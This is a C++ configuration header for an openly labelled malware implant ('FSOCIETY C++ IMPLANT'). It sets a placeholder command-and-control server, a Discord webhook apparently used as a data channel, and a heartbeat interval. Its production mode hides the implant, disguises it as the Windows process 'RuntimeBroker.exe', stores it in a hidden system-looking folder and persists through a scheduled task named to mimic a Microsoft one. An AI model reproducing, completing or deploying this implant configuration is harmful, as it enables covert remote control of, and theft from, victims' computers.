#pragma once

// ============================================================
// FSOCIETY C++ IMPLANT — CONFIGURATION
// ============================================================

// --- OPERATIONAL MODE ---
// true  = Safe: shows console, no persistence, no masquerade
// false = Production: hidden, persistent, auto-start on boot
#define TEST_MODE true

// --- C2 Server ---
#define C2_HOST       L"YOUR_C2_SERVER_IP"
#define C2_PORT       8080
#define C2_HOST_A     "YOUR_C2_SERVER_IP"

// --- Discord Webhook ---
#define DISCORD_HOST  L"discord.com"
#define DISCORD_PATH  L"/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"

// --- Timing ---
#define HEARTBEAT_MS  5000

// --- Persistence (only when TEST_MODE = false) ---
#define FAKE_EXE_NAME "RuntimeBroker.exe"
#define HIDDEN_DIR    "C:\\ProgramData\\Windows NT"
#define TASK_NAME     "Microsoft\\Windows\\Wininet\\CacheTask"
